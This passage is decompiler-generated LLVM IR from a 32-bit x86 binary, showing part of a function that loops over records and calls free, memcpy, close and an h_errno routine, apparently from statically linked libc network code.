  %v12_804c4a7 = icmp eq i32 %v3_804c49d, 28
  %v1_804c4af = icmp eq i1 %v12_804c4a7, false
  br i1 %v1_804c4af, label %dec_label_pc_804c552, label %dec_label_pc_804c4b5

dec_label_pc_804c4b5:                             ; preds = %dec_label_pc_804c45c.dec_label_pc_804c4b5_crit_edge, %dec_label_pc_804c4a7, %dec_label_pc_804c49d
  %v4_804c4b5 = phi i32 [ %v4_804c4b5.pre, %dec_label_pc_804c45c.dec_label_pc_804c4b5_crit_edge ], [ %v3_804c49d, %dec_label_pc_804c4a7 ], [ %v3_804c49d, %dec_label_pc_804c49d ]
  %v15_804c4b5 = icmp eq i32 %v3_804c488, %v4_804c4b5
  br i1 %v15_804c4b5, label %dec_label_pc_804c4ca, label %dec_label_pc_804c4be

dec_label_pc_804c4be:                             ; preds = %dec_label_pc_804c4b5
  %v1_804c4c1 = inttoptr i32 %v0_804c488 to i32*
  %v2_804c4c1 = load i32, i32* %v1_804c4c1, align 4
  %v5_804c4c1 = inttoptr i32 %v0_804c48b to i32*
  store i32 %v2_804c4c1, i32* %v5_804c4c1, align 4
  %v1_804c4c3 = call i32 @free(i32 -1)
  store i32 %v1_804c4c3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c53a

dec_label_pc_804c4ca:                             ; preds = %dec_label_pc_804c4b5
  %v0_804c4ca = load i32, i32* @ebx, align 4
  %v1_804c4cc = sub i32 -1, %v0_804c4ca
  store i32 %v1_804c4cc, i32* %eax.global-to-local, align 4
  %v2_804c4ce = add i32 %v0_804c48b, 120
  %v3_804c4ce = inttoptr i32 %v2_804c4ce to i32*
  %v4_804c4ce = load i32, i32* %v3_804c4ce, align 4
  %v5_804c4ce = add i32 %v4_804c4ce, %v1_804c4cc
  store i32 %v5_804c4ce, i32* %eax.global-to-local, align 4
  %v2_804c4d2 = add i32 %v0_804c488, 36
  %v3_804c4d2 = inttoptr i32 %v2_804c4d2 to i32*
  store i32 %v5_804c4ce, i32* %v3_804c4d2, align 4
  %v0_804c4d5 = load i32, i32* @edi, align 4
  %v1_804c4d5 = add i32 %v0_804c4d5, 16
  %v2_804c4d5 = inttoptr i32 %v1_804c4d5 to i32*
  %v3_804c4d5 = load i32, i32* %v2_804c4d5, align 4
  %v1_804c4d8 = add i32 %v3_804c4d5, 4
  store i32 %v1_804c4d8, i32* %eax.global-to-local, align 4
  %v2_804c4db = add i32 %v0_804c4d5, 36
  %v3_804c4db = inttoptr i32 %v2_804c4db to i32*
  %v4_804c4db = load i32, i32* %v3_804c4db, align 4
  %v7_804c4db = mul i32 %v4_804c4db, %v1_804c4d8
  store i32 %v7_804c4db, i32* %eax.global-to-local, align 4
  %v2_804c4df = add i32 %v0_804c4d5, 32
  %v3_804c4df = inttoptr i32 %v2_804c4df to i32*
  %v4_804c4df = load i32, i32* %v3_804c4df, align 4
  %v6_804c4e2 = icmp ugt i32 %v7_804c4db, %v4_804c4df
  br i1 %v6_804c4e2, label %dec_label_pc_804c4ca.dec_label_pc_804c552.loopexit_crit_edge, label %dec_label_pc_804c4e4

dec_label_pc_804c4ca.dec_label_pc_804c552.loopexit_crit_edge: ; preds = %dec_label_pc_804c4ca
  %v0_804c552.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c552

dec_label_pc_804c4e4:                             ; preds = %dec_label_pc_804c4ca
  store i32 0, i32* %v3_804c4db, align 4
  %v0_804c4eb = load i32, i32* @esp, align 4
  %v1_804c4eb = add i32 %v0_804c4eb, 27
  %v2_804c4eb = inttoptr i32 %v1_804c4eb to i8*
  store i8 0, i8* %v2_804c4eb, align 1
  %v1_804c53d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c53d

dec_label_pc_804c4f2:                             ; preds = %dec_label_pc_804c451
  %v1_804c4f5 = add i32 %v0_804c432, 132
  %v2_804c4f5 = inttoptr i32 %v1_804c4f5 to i32*
  %v3_804c4f5 = load i32, i32* %v2_804c4f5, align 4
  %v6_804c4f5 = inttoptr i32 %v0_804c432 to i32*
  store i32 %v3_804c4f5, i32* %v6_804c4f5, align 4
  %v1_804c4fc = call i32 @free(i32 -1)
  store i32 %v1_804c4fc, i32* %eax.global-to-local, align 4
  %v0_804c501 = load i32, i32* @esp, align 4
  %v1_804c501 = add i32 %v0_804c501, 16
  %v1_804c504 = add i32 %v0_804c501, 260
  %v2_804c504 = inttoptr i32 %v1_804c504 to i32*
  %v3_804c504 = load i32, i32* %v2_804c504, align 4
  store i32 %v3_804c504, i32* %eax.global-to-local, align 4
  %v1_804c50b = add i32 %v0_804c501, 136
  %v2_804c50b = inttoptr i32 %v1_804c50b to i32*
  %v3_804c50b = load i32, i32* %v2_804c50b, align 4
  %v15_804c50b = icmp eq i32 %v3_804c50b, %v3_804c504
  %v1_804c50f = icmp eq i1 %v15_804c50b, false
  br i1 %v1_804c50f, label %dec_label_pc_804c53d, label %dec_label_pc_804c511

dec_label_pc_804c511:                             ; preds = %dec_label_pc_804c4f2
  %v0_804c511 = load i32, i32* @edi, align 4
  %v1_804c511 = add i32 %v0_804c511, 16
  %v2_804c511 = inttoptr i32 %v1_804c511 to i32*
  %v3_804c511 = load i32, i32* %v2_804c511, align 4
  store i32 %v3_804c511, i32* %eax.global-to-local, align 4
  %v2_804c514 = add i32 %v0_804c501, 148
  %v3_804c514 = inttoptr i32 %v2_804c514 to i32*
  %v4_804c514 = load i32, i32* %v3_804c514, align 4
  %v15_804c514 = icmp eq i32 %v3_804c511, %v4_804c514
  %v1_804c51b = icmp eq i1 %v15_804c514, false
  br i1 %v1_804c51b, label %dec_label_pc_804c5d7, label %dec_label_pc_804c521

dec_label_pc_804c521:                             ; preds = %dec_label_pc_804c511
  %v0_804c521 = load i32, i32* @edx, align 4
  %v2_804c521 = add i32 %v0_804c501, 12
  %v3_804c521 = inttoptr i32 %v2_804c521 to i32*
  store i32 %v0_804c521, i32* %v3_804c521, align 4
  %v0_804c522 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c522 = add i32 %v0_804c501, 8
  %v3_804c522 = inttoptr i32 %v2_804c522 to i32*
  store i32 %v0_804c522, i32* %v3_804c522, align 4
  %v1_804c523 = add i32 %v0_804c501, 152
  %v2_804c523 = inttoptr i32 %v1_804c523 to i32*
  %v3_804c523 = load i32, i32* %v2_804c523, align 4
  %v5_804c523 = add i32 %v0_804c501, 4
  %v6_804c523 = inttoptr i32 %v5_804c523 to i32*
  store i32 %v3_804c523, i32* %v6_804c523, align 4
  %v0_804c52a = load i32, i32* %eax.global-to-local, align 4
  %v1_804c52a = load i32, i32* @edi, align 4
  %v2_804c52a = add i32 %v1_804c52a, 36
  %v3_804c52a = inttoptr i32 %v2_804c52a to i32*
  %v4_804c52a = load i32, i32* %v3_804c52a, align 4
  %v7_804c52a = mul i32 %v4_804c52a, %v0_804c52a
  store i32 %v7_804c52a, i32* %eax.global-to-local, align 4
  %v2_804c52e = add i32 %v1_804c52a, 28
  %v3_804c52e = inttoptr i32 %v2_804c52e to i32*
  %v4_804c52e = load i32, i32* %v3_804c52e, align 4
  %v5_804c52e = add i32 %v4_804c52e, %v7_804c52a
  store i32 %v5_804c52e, i32* %eax.global-to-local, align 4
  %v3_804c531 = inttoptr i32 %v0_804c501 to i32*
  store i32 %v5_804c52e, i32* %v3_804c531, align 4
  %v4_804c532 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c532, i32* %eax.global-to-local, align 4
  %v0_804c537 = load i32, i32* @edi, align 4
  %v1_804c537 = add i32 %v0_804c537, 36
  %v2_804c537 = inttoptr i32 %v1_804c537 to i32*
  %v3_804c537 = load i32, i32* %v2_804c537, align 4
  %v4_804c537 = add i32 %v3_804c537, 1
  store i32 %v4_804c537, i32* %v2_804c537, align 4
  br label %dec_label_pc_804c53a

dec_label_pc_804c53a:                             ; preds = %dec_label_pc_804c4be, %dec_label_pc_804c521
  %v0_804c53a = load i32, i32* @esp, align 4
  %v1_804c53a = add i32 %v0_804c53a, 16
  br label %dec_label_pc_804c53d

dec_label_pc_804c53d:                             ; preds = %dec_label_pc_804c4f2, %dec_label_pc_804c4e4, %dec_label_pc_804c53a
  %v1_804c53d = phi i32 [ %v1_804c501, %dec_label_pc_804c4f2 ], [ %v1_804c53d.pre, %dec_label_pc_804c4e4 ], [ %v1_804c53a, %dec_label_pc_804c53a ]
  %v0_804c53d = load i32, i32* @esi, align 4
  %v2_804c53d = add i32 %v1_804c53d, 52
  %v3_804c53d = inttoptr i32 %v2_804c53d to i32*
  %v4_804c53d = load i32, i32* %v3_804c53d, align 4
  %v5_804c53d = add i32 %v4_804c53d, %v0_804c53d
  store i32 %v5_804c53d, i32* @esi, align 4
  %v0_804c541 = load i32, i32* @ebx, align 4
  %v1_804c541 = add i32 %v0_804c541, 1
  store i32 %v1_804c541, i32* @ebx, align 4
  %v2_804c542 = add i32 %v1_804c53d, 104
  %v3_804c542 = inttoptr i32 %v2_804c542 to i32*
  %v4_804c542 = load i32, i32* %v3_804c542, align 4
  %v5_804c542 = sub i32 %v1_804c541, %v4_804c542
  %v11_804c542 = xor i32 %v4_804c542, %v1_804c541
  %v12_804c542 = xor i32 %v5_804c542, %v1_804c541
  %v13_804c542 = and i32 %v12_804c542, %v11_804c542
  %v14_804c542 = icmp slt i32 %v13_804c542, 0
  %v16_804c542 = icmp slt i32 %v5_804c542, 0
  %v2_804c546 = icmp eq i1 %v16_804c542, %v14_804c542
  br i1 %v2_804c546, label %dec_label_pc_804c552, label %dec_label_pc_804c548

dec_label_pc_804c548:                             ; preds = %dec_label_pc_804c548.lr.ph, %dec_label_pc_804c53d
  %v0_804c548 = phi i32 [ %v0_804c548.pre, %dec_label_pc_804c548.lr.ph ], [ %v5_804c53d, %dec_label_pc_804c53d ]
  %v0_804c41e81 = phi i32 [ %v1_804c542.pre, %dec_label_pc_804c548.lr.ph ], [ %v1_804c53d, %dec_label_pc_804c53d ]
  %v2_804c548 = add i32 %v0_804c41e81, 16
  %v3_804c548 = inttoptr i32 %v2_804c548 to i32*
  %v4_804c548 = load i32, i32* %v3_804c548, align 4
  %v5_804c548 = sub i32 %v0_804c548, %v4_804c548
  %v11_804c548 = xor i32 %v4_804c548, %v0_804c548
  %v12_804c548 = xor i32 %v5_804c548, %v0_804c548
  %v13_804c548 = and i32 %v12_804c548, %v11_804c548
  %v14_804c548 = icmp slt i32 %v13_804c548, 0
  %v16_804c548 = icmp slt i32 %v5_804c548, 0
  %v2_804c54c = icmp eq i1 %v16_804c548, %v14_804c548
  br i1 %v2_804c54c, label %dec_label_pc_804c552, label %dec_label_pc_804c41e

dec_label_pc_804c552:                             ; preds = %dec_label_pc_804c441, %dec_label_pc_804c412, %dec_label_pc_804c53d, %dec_label_pc_804c493, %dec_label_pc_804c4a7, %dec_label_pc_804c548, %dec_label_pc_804c4ca.dec_label_pc_804c552.loopexit_crit_edge
  %v0_804c552 = phi i32 [ %v0_804c552.pre.pre, %dec_label_pc_804c4ca.dec_label_pc_804c552.loopexit_crit_edge ], [ %v1_804c542.pre, %dec_label_pc_804c412 ], [ %v1_804c53d, %dec_label_pc_804c53d ], [ %v1_804c48b, %dec_label_pc_804c493 ], [ %v1_804c48b, %dec_label_pc_804c4a7 ], [ %v0_804c41e81, %dec_label_pc_804c548 ], [ %v1_804c432, %dec_label_pc_804c441 ]
  %v1_804c555 = add i32 %v0_804c552, 20
  %v2_804c555 = inttoptr i32 %v1_804c555 to i32*
  %v3_804c555 = load i32, i32* %v2_804c555, align 4
  %v5_804c555 = add i32 %v0_804c552, -16
  %v6_804c555 = inttoptr i32 %v5_804c555 to i32*
  store i32 %v3_804c555, i32* %v6_804c555, align 4
  %v1_804c559 = call i32 @__libc_close(i32 -1)
  store i32 %v1_804c559, i32* %eax.global-to-local, align 4
  %v0_804c55e = load i32, i32* @esp, align 4
  %v1_804c561 = add i32 %v0_804c55e, 272
  %v2_804c561 = inttoptr i32 %v1_804c561 to i32*
  %v3_804c561 = load i32, i32* %v2_804c561, align 4
  %v4_804c561 = icmp eq i32 %v3_804c561, 0
  br i1 %v4_804c561, label %dec_label_pc_804c576, label %dec_label_pc_804c56b

dec_label_pc_804c56b:                             ; preds = %dec_label_pc_804c552
  store i32 %v3_804c561, i32* %edx.global-to-local, align 4
  %v2_804c572 = inttoptr i32 %v3_804c561 to i32*
  store i32 %v2_804bfe2, i32* %v2_804c572, align 4
  %v0_804c582.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c582

dec_label_pc_804c576:                             ; preds = %dec_label_pc_804c552
  %v3_804c579 = inttoptr i32 %v0_804c55e to i32*
  store i32 %v2_804bfe2, i32* %v3_804c579, align 4
  %v1_804c57a = call i32 @free(i32 -1)
  store i32 %v1_804c57a, i32* %eax.global-to-local, align 4
  %v0_804c57f = load i32, i32* @esp, align 4
  %v1_804c57f = add i32 %v0_804c57f, 16
  br label %dec_label_pc_804c582

dec_label_pc_804c582:                             ; preds = %dec_label_pc_804c56b, %dec_label_pc_804c576
  %v0_804c582 = phi i32 [ %v0_804c582.pre, %dec_label_pc_804c56b ], [ %v1_804c57f, %dec_label_pc_804c576 ]
  %v1_804c585 = add i32 %v0_804c582, 12
  %v2_804c585 = inttoptr i32 %v1_804c585 to i32*
  %v3_804c585 = load i32, i32* %v2_804c585, align 4
  %v5_804c585 = add i32 %v0_804c582, -16
  %v6_804c585 = inttoptr i32 %v5_804c585 to i32*
  store i32 %v3_804c585, i32* %v6_804c585, align 4
  %v1_804c589 = call i32 @free(i32 -1)
  store i32 %v1_804c589, i32* @eax, align 4
  %v0_804c58e = load i32, i32* @esp, align 4
  %v1_804c591 = add i32 %v0_804c58e, 8
  %v2_804c591 = inttoptr i32 %v1_804c591 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c591, align 4
  %v1_804c596 = add i32 %v0_804c58e, 4
  %v2_804c596 = inttoptr i32 %v1_804c596 to i32*
  store i32 134526871, i32* %v2_804c596, align 4
  %v1_804c59b = add i32 %v0_804c58e, 200
  store i32 %v1_804c59b, i32* %ebx.global-to-local, align 4
  %v3_804c5a2 = inttoptr i32 %v0_804c58e to i32*
  store i32 %v1_804c59b, i32* %v3_804c5a2, align 4
  %v2_804c5a3 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c5a3, i32* %eax.global-to-local, align 4
  %v0_804c5a8 = load i32, i32* @esp, align 4
  %v1_804c5a8 = inttoptr i32 %v0_804c5a8 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c5a8, align 4
  %v1_804c5af = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c5af, i32* %eax.global-to-local, align 4
  %v0_804c5b4 = load i32, i32* @esp, align 4
  %v1_804c5b4 = add i32 %v0_804c5b4, 56
  %v2_804c5b4 = inttoptr i32 %v1_804c5b4 to i32*
  %v3_804c5b4 = load i32, i32* %v2_804c5b4, align 4
  store i32 %v3_804c5b4, i32* @eax, align 4
  %v1_804c5b8 = add i32 %v0_804c5b4, 60
  %v2_804c5b8 = inttoptr i32 %v1_804c5b8 to i32*
  %v3_804c5b8 = load i32, i32* %v2_804c5b8, align 4
  store i32 %v3_804c5b8, i32* %edx.global-to-local, align 4
  %v1_804c5bc = inttoptr i32 %v0_804c5b4 to i32*
  %v3_804c5bc = add i32 %v0_804c5b4, 4
  %v1_804c5bd = inttoptr i32 %v3_804c5bc to i32*
  %v1_804c5be = sext i32 %v3_804c5b4 to i64
  store i64 %v1_804c5be, i64* @global_var_8052540.85, align 64
  %v1_804c5c3 = trunc i32 %v3_804c5b8 to i16
  store i16 %v1_804c5c3, i16* @global_var_805215c.86, align 4
  store i32 1, i32* %v1_804c5bd, align 4
  %v0_804c5cc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c5cc, i32* %v1_804c5bc, align 4
  %v2_804c5cd = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c5cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c70e

dec_label_pc_804c5d7:                             ; preds = %dec_label_pc_804c511
  %v1_804c5da = inttoptr i32 %v0_804c511 to i32*
  %v2_804c5da = load i32, i32* %v1_804c5da, align 4
  %v5_804c5da = inttoptr i32 %v0_804c501 to i32*
  store i32 %v2_804c5da, i32* %v5_804c5da, align 4
  %v1_804c5dc = call i32 @free(i32 -1)
  store i32 %v1_804c5dc, i32* @eax, align 4
  %v0_804c5e1 = load i32, i32* @esp, align 4
  %v1_804c5e1 = add i32 %v0_804c5e1, 16
  br label %dec_label_pc_804c5e4

dec_label_pc_804c5e4:                             ; preds = %dec_label_pc_804c316, %dec_label_pc_804c441, %dec_label_pc_804c439, %dec_label_pc_804c3d5, %dec_label_pc_804c35b, %dec_label_pc_804c337, %dec_label_pc_804c5d7
  %v1_804c5eb = phi i32 [ %v1_804c32b, %dec_label_pc_804c316 ], [ %v1_804c432, %dec_label_pc_804c441 ], [ %v1_804c432, %dec_label_pc_804c439 ], [ %v1_804c34c, %dec_label_pc_804c3d5 ], [ %v1_804c34c, %dec_label_pc_804c35b ], [ %v1_804c34c, %dec_label_pc_804c337 ], [ %v1_804c5e1, %dec_label_pc_804c5d7 ]
  %v1_804c5e4 = add i32 %v1_804c5eb, 51
  %v2_804c5e4 = inttoptr i32 %v1_804c5e4 to i8*
  %v3_804c5e4 = load i8, i8* %v2_804c5e4, align 1
  %v4_804c5e4 = icmp eq i8 %v3_804c5e4, 0
  %v1_804c5e9 = icmp eq i1 %v4_804c5e4, false
  br i1 %v1_804c5e9, label %dec_label_pc_804c62f, label %dec_label_pc_804c5eb

dec_label_pc_804c5eb:                             ; preds = %dec_label_pc_804c5e4
  %v0_804c5eb = load i32, i32* @ecx, align 4
  %v2_804c5eb = add i32 %v1_804c5eb, -4
  %v3_804c5eb = inttoptr i32 %v2_804c5eb to i32*
  store i32 %v0_804c5eb, i32* %v3_804c5eb, align 4
  %v1_804c5ec = add i32 %v1_804c5eb, -8
  %v2_804c5ec = inttoptr i32 %v1_804c5ec to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c5ec, align 4
  %v1_804c5f1 = add i32 %v1_804c5eb, -12
  %v2_804c5f1 = inttoptr i32 %v1_804c5f1 to i32*
  store i32 134526871, i32* %v2_804c5f1, align 4
  %v1_804c5f6 = add i32 %v1_804c5eb, 184
  store i32 %v1_804c5f6, i32* @esi, align 4
  %v2_804c5fd = add i32 %v1_804c5eb, -16
  %v3_804c5fd = inttoptr i32 %v2_804c5fd to i32*
  store i32 %v1_804c5f6, i32* %v3_804c5fd, align 4
  %v2_804c5fe = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c5fe, i32* %eax.global-to-local, align 4
  %v0_804c603 = load i32, i32* @esp, align 4
  %v1_804c603 = inttoptr i32 %v0_804c603 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c603, align 4
  %v1_804c60a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c60a, i32* %eax.global-to-local, align 4
  %v0_804c60f = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c60f, i32* %ebx.global-to-local, align 4
  %v0_804c615 = load i32, i32* @esp, align 4
  %v1_804c615 = inttoptr i32 %v0_804c615 to i32*
  %v2_804c615 = load i32, i32* %v1_804c615, align 4
  store i32 %v2_804c615, i32* @eax, align 4
  %v3_804c615 = add i32 %v0_804c615, 4
  %v1_804c616 = inttoptr i32 %v3_804c615 to i32*
  %v2_804c616 = load i32, i32* %v1_804c616, align 4
  store i32 %v2_804c616, i32* %edx.global-to-local, align 4
  %v1_804c617 = add i32 %v0_804c60f, -1
  store i32 %v1_804c617, i32* @ebx, align 4
  store i32 1, i32* %v1_804c616, align 4
  %v0_804c61a = load i32, i32* @esi, align 4
  store i32 %v0_804c61a, i32* %v1_804c615, align 4
  %v2_804c61b = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c61b, i32* %eax.global-to-local, align 4
  %v0_804c620 = load i32, i32* @esp, align 4
  %v1_804c620 = add i32 %v0_804c620, 16
  %v1_804c623 = add i32 %v0_804c620, 52
  %v2_804c623 = inttoptr i32 %v1_804c623 to i32*
  %v3_804c623 = load i32, i32* %v2_804c623, align 4
  %v4_804c623 = load i32, i32* @ebx, align 4
  %v5_804c623 = sub i32 %v3_804c623, %v4_804c623
  %v11_804c623 = xor i32 %v4_804c623, %v3_804c623
  %v12_804c623 = xor i32 %v5_804c623, %v3_804c623
  %v13_804c623 = and i32 %v12_804c623, %v11_804c623
  %v14_804c623 = icmp slt i32 %v13_804c623, 0
  %v16_804c623 = icmp slt i32 %v5_804c623, 0
  %v2_804c627 = icmp eq i1 %v16_804c623, %v14_804c623
  br i1 %v2_804c627, label %dec_label_pc_804c62f, label %dec_label_pc_804c629

dec_label_pc_804c629:                             ; preds = %dec_label_pc_804c5eb
  %v4_804c629 = add i32 %v3_804c623, 1
  store i32 %v4_804c629, i32* %v2_804c623, align 4
  br label %dec_label_pc_804c650.backedge

dec_label_pc_804c62f:                             ; preds = %dec_label_pc_804c2b8, %dec_label_pc_804c5eb, %dec_label_pc_804c5e4, %dec_label_pc_804c2cf
  %v1_804c63e = phi i32 [ %v1_804c620, %dec_label_pc_804c5eb ], [ %v1_804c5eb, %dec_label_pc_804c5e4 ], [ %v1_804c30b, %dec_label_pc_804c2cf ], [ %v0_804c62f.pre, %dec_label_pc_804c2b8 ]
  %v1_804c62f = add i32 %v1_804c63e, 40
  %v2_804c62f = inttoptr i32 %v1_804c62f to i32*
  %v3_804c62f = load i32, i32* %v2_804c62f, align 4
  %v1_804c633 = add i32 %v3_804c62f, 1
  store i32 %v1_804c633, i32* %eax.global-to-local, align 4
  %v1_804c634 = ashr i32 %v1_804c633, 31
  store i32 %v1_804c634, i32* %edx.global-to-local, align 4
  %v1_804c635 = add i32 %v1_804c63e, 248
  %v2_804c635 = inttoptr i32 %v1_804c635 to i32*
  %v3_804c635 = load i32, i32* %v2_804c635, align 4
  %v5_804c635 = zext i32 %v1_804c633 to i64
  %v7_804c635 = zext i32 %v1_804c634 to i64
  %v8_804c635 = mul nuw i64 %v7_804c635, 4294967296
  %v9_804c635 = or i64 %v8_804c635, %v5_804c635
  %v10_804c635 = zext i32 %v3_804c635 to i64
  %v11_804c635 = sdiv i64 %v9_804c635, %v10_804c635
  %v12_804c635 = trunc i64 %v11_804c635 to i32
  store i32 %v12_804c635, i32* %eax.global-to-local, align 4
  %v13_804c635 = srem i64 %v9_804c635, %v10_804c635
  %v14_804c635 = trunc i64 %v13_804c635 to i32
  store i32 %v14_804c635, i32* %edx.global-to-local, align 4
  %v1_804c63c = icmp eq i32 %v14_804c635, 0
  store i32 %v14_804c635, i32* %v2_804c62f, align 4
  %v1_804c642 = icmp eq i1 %v1_804c63c, false
  br i1 %v1_804c642, label %dec_label_pc_804c648, label %dec_label_pc_804c644

dec_label_pc_804c644:                             ; preds = %dec_label_pc_804c62f
  %v0_804c644 = load i32, i32* @esp, align 4
  %v1_804c644 = add i32 %v0_804c644, 28
  %v2_804c644 = inttoptr i32 %v1_804c644 to i32*
  %v3_804c644 = load i32, i32* %v2_804c644, align 4
  %v4_804c644 = add i32 %v3_804c644, 1
  store i32 %v4_804c644, i32* %v2_804c644, align 4
  br label %dec_label_pc_804c648

dec_label_pc_804c648:                             ; preds = %dec_label_pc_804c62f, %dec_label_pc_804c644
  %v0_804c648 = load i32, i32* @esp, align 4
  %v1_804c648 = add i32 %v0_804c648, 36
  %v2_804c648 = inttoptr i32 %v1_804c648 to i32*
  store i32 -1, i32* %v2_804c648, align 4
  br label %dec_label_pc_804c650.backedge

dec_label_pc_804c650.backedge:                    ; preds = %dec_label_pc_804c648, %dec_label_pc_804c2c6, %dec_label_pc_804c3b4, %dec_label_pc_804c629
  %v0_804c650.pre = load i32, i32* @esp, align 4
  %v1_804c650 = add i32 %v0_804c650.pre, 28
  %v2_804c650 = inttoptr i32 %v1_804c650 to i32*
  %v3_804c650 = load i32, i32* %v2_804c650, align 4
  %tmp122 = icmp ult i32 %v3_804c650, 3
  br i1 %tmp122, label %dec_label_pc_804c0b0, label %dec_label_pc_804c675

dec_label_pc_804c675:                             ; preds = %dec_label_pc_804c02a, %dec_label_pc_804c0c6, %dec_label_pc_804c1ba, %dec_label_pc_804c650.backedge, %entry, %dec_label_pc_804c004, %dec_label_pc_804c00c, %dec_label_pc_804c01a
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_804c01a ], [ -1, %dec_label_pc_804c00c ], [ -1, %dec_label_pc_804c004 ], [ -1, %entry ], [ %v0_804c077, %dec_label_pc_804c650.backedge ], [ %v0_804c077, %dec_label_pc_804c1ba ], [ %v0_804c077, %dec_label_pc_804c0c6 ], [ %v0_804c077, %dec_label_pc_804c02a ]
  %v0_804c675 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c675, i32* %eax.global-to-local, align 4
  %v1_804c67a = inttoptr i32 %v0_804c675 to i32*
  store i32 -1, i32* %v1_804c67a, align 4
  %v0_804c680 = load i32, i32* @esp, align 4
  %v1_804c680 = add i32 %v0_804c680, 56
  %v2_804c680 = inttoptr i32 %v1_804c680 to i32*
  %v3_804c680 = load i32, i32* %v2_804c680, align 4
  store i32 %v3_804c680, i32* %eax.global-to-local, align 4
  %v2_804c684 = add i32 %v0_804c680, 44
  %v3_804c684 = inttoptr i32 %v2_804c684 to i32*
  store i32 %v3_804c680, i32* %v3_804c684, align 4
  br label %dec_label_pc_804c688

dec_label_pc_804c688:                             ; preds = %dec_label_pc_804c3ed, %dec_label_pc_804c3c5, %dec_label_pc_804c675
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_804c675 ], [ %v0_804c077, %dec_label_pc_804c3ed ], [ %v0_804c077, %dec_label_pc_804c3c5 ]
  %v0_804c688 = load i32, i32* @esp, align 4
  %v1_804c688 = add i32 %v0_804c688, 20
  %v2_804c688 = inttoptr i32 %v1_804c688 to i32*
  %v3_804c688 = load i32, i32* %v2_804c688, align 4
  %v13_804c688 = icmp eq i32 %v3_804c688, -1
  br i1 %v13_804c688, label %dec_label_pc_804c688.dec_label_pc_804c69e_crit_edge, label %dec_label_pc_804c68f

dec_label_pc_804c688.dec_label_pc_804c69e_crit_edge: ; preds = %dec_label_pc_804c688
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_804c69e

dec_label_pc_804c68f:                             ; preds = %dec_label_pc_804c688
  %v3_804c692 = load i32, i32* %v2_804c688, align 4
  %v5_804c692 = add i32 %v0_804c688, -16
  %v6_804c692 = inttoptr i32 %v5_804c692 to i32*
  store i32 %v3_804c692, i32* %v6_804c692, align 4
  %v1_804c696 = sext i16 %stack_var_-180.1 to i32
  %v2_804c696 = call i32 @__libc_close(i32 %v1_804c696)
  store i32 %v2_804c696, i32* %eax.global-to-local, align 4
  %v0_804c69b = load i32, i32* @esp, align 4
  %v1_804c69b = add i32 %v0_804c69b, 16
  br label %dec_label_pc_804c69e

dec_label_pc_804c69e:                             ; preds = %dec_label_pc_804c688.dec_label_pc_804c69e_crit_edge, %dec_label_pc_804c68f
  %v1_804c6a5.pre-phi = phi i32 [ %.pre, %dec_label_pc_804c688.dec_label_pc_804c69e_crit_edge ], [ %v1_804c696, %dec_label_pc_804c68f ]
  %v0_804c69e = phi i32 [ %v0_804c688, %dec_label_pc_804c688.dec_label_pc_804c69e_crit_edge ], [ %v1_804c69b, %dec_label_pc_804c68f ]
  %v1_804c6a1 = add i32 %v0_804c69e, 12
  %v2_804c6a1 = inttoptr i32 %v1_804c6a1 to i32*
  %v3_804c6a1 = load i32, i32* %v2_804c6a1, align 4
  %v5_804c6a1 = add i32 %v0_804c69e, -16
  %v6_804c6a1 = inttoptr i32 %v5_804c6a1 to i32*
  store i32 %v3_804c6a1, i32* %v6_804c6a1, align 4
  %v2_804c6a5 = call i32 @free(i32 %v1_804c6a5.pre-phi)
  store i32 %v2_804c6a5, i32* %eax.global-to-local, align 4
  %v1_804c6aa = load i32, i32* @esp, align 4
  %v2_804c6aa = inttoptr i32 %v1_804c6aa to i32*
  store i32 %v2_804bfe2, i32* %v2_804c6aa, align 4
  %v2_804c6ad = call i32 @free(i32 %v1_804c6a5.pre-phi)
  store i32 %v2_804c6ad, i32* @eax, align 4
  %v0_804c6b2 = load i32, i32* @esp, align 4
  %v1_804c6b5 = add i32 %v0_804c6b2, 56
  %v2_804c6b5 = inttoptr i32 %v1_804c6b5 to i32*
  %v3_804c6b5 = load i32, i32* %v2_804c6b5, align 4
  %v13_804c6b5 = icmp eq i32 %v3_804c6b5, -1
  %v1_804c6ba = add i32 %v0_804c6b2, 32
  %v2_804c6ba = inttoptr i32 %v1_804c6ba to i32*
  store i32 -1, i32* %v2_804c6ba, align 4
  br i1 %v13_804c6b5, label %dec_label_pc_804c69e.dec_label_pc_804c711_crit_edge, label %dec_label_pc_804c6c4

dec_label_pc_804c69e.dec_label_pc_804c711_crit_edge: ; preds = %dec_label_pc_804c69e
  %v0_804c711.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c711

dec_label_pc_804c6c4:                             ; preds = %dec_label_pc_804c69e
  %v0_804c6c4 = load i32, i32* @ecx, align 4
  %v1_804c6c4 = load i32, i32* @esp, align 4
  %v2_804c6c4 = add i32 %v1_804c6c4, -4
  %v3_804c6c4 = inttoptr i32 %v2_804c6c4 to i32*
  store i32 %v0_804c6c4, i32* %v3_804c6c4, align 4
  %v1_804c6c5 = add i32 %v1_804c6c4, -8
